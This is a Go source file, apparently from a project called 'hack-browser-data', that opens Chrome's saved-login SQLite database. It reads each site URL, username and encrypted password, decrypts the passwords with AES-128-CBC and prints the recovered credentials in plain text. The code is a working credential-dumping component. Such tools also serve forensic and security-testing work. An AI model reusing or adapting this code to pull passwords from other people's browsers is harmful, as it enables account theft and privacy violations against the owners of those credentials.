package common

import (
	"database/sql"
	"fmt"
	"hack-browser-data/log"
	"hack-browser-data/utils"

	_ "github.com/mattn/go-sqlite3"
)

const (
	Chrome = "Chrome"
	Safari = "Safari"
)

type (
	BrowserData struct {
		BrowserName string
		LoginData   []LoginData
	}
	LoginData struct {
		UserName    string
		encryptPass []byte
		Password    string
		LoginUrl    string
	}
	History struct {
	}
	Cookie struct {
	}
	BookMark struct {
	}
)

func ParseDB() (results []*LoginData) {
	//datetime(visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch')
	loginD := &LoginData{}
	logins, err := sql.Open("sqlite3", utils.LoginData)
	defer func() {
		if err := logins.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = logins.Ping()
	log.Println(err)
	rows, err := logins.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	log.Println(err)
	for rows.Next() {
		var (
			url      string
			username string
			pwd      []byte
			password string
		)
		err = rows.Scan(&url, &username, &pwd)
		loginD = &LoginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if len(pwd) > 3 {
			password, err = utils.Aes128CBCDecrypt(pwd[3:])
			if err != nil {
				panic(err)
			}
		}
		loginD.Password = password
		if err != nil {
			log.Println(err)
		}
		fmt.Printf("%+v\n", loginD)
		results = append(results, loginD)
	}
	return
}
